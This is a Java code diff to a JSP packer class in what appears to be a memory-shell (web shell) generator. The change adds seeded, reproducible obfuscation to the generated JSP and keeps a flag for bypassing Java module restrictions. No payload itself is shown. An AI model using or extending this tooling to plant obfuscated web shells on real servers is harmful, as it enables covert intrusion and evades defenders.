@@ -1,8 +1,10 @@
 package org.leo.jmg.mem.packer.jsp;
 
+import org.leo.core.util.request.GenerationRandom;
 import org.leo.jmg.mem.packer.ClassPackerConfig;
 import org.leo.jmg.mem.packer.Packer;
 import org.leo.jmg.mem.packer.PackerMeta;
+import org.leo.jmg.mem.packer.PackerRegistry;
 import org.leo.jmg.mem.packer.TemplateRenderer;
 import org.leo.jmg.mem.packer.Util;
 
@@ -25,17 +27,24 @@ public class DefineClassJspPacker implements Packer {
 
     @Override
     public String pack(ClassPackerConfig config) {
-        // AI 生成的自定义模板优先；未提供时按 byPassJavaModule 选择内置模板
-        String tpl;
-        if (config.getCustomTemplate() != null && !config.getCustomTemplate().trim().isEmpty()) {
-            tpl = config.getCustomTemplate();
-        } else {
-            tpl = config.isByPassJavaModule() ? bypassTemplate : template;
+        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.getObfuscationSeed())) {
+            // AI 生成的自定义模板优先；未提供时按 byPassJavaModule 选择内置模板
+            String tpl;
+            if (config.getCustomTemplate() != null && !config.getCustomTemplate().trim().isEmpty()) {
+                tpl = config.getCustomTemplate();
+            } else {
+                tpl = config.isByPassJavaModule() ? bypassTemplate : template;
+            }
+            String code = TemplateRenderer.render(tpl, config);
+            JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
+                    ? JspObfuscationPipeline.fromStepIds(
+                            config.getJspObfuscationSteps(),
+                            JspObfuscationPipeline.PlanContext.packer(
+                                    JspObfuscationPipeline.ArtifactFormat.JSP,
+                                    PackerRegistry.getSupportedObfuscationSteps("DefineClassJSP"),
+                                    config.getObfuscationSeed()))
+                    : JspObfuscationPipeline.jspDefault(config.getObfuscationSeed());
+            return pipeline.apply(code);
         }
-        String code = TemplateRenderer.render(tpl, config);
-        JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
-                ? JspObfuscationPipeline.fromStepIds(config.getJspObfuscationSteps())
-                : JspObfuscationPipeline.jspDefault();
-        return pipeline.apply(code);
     }
 }
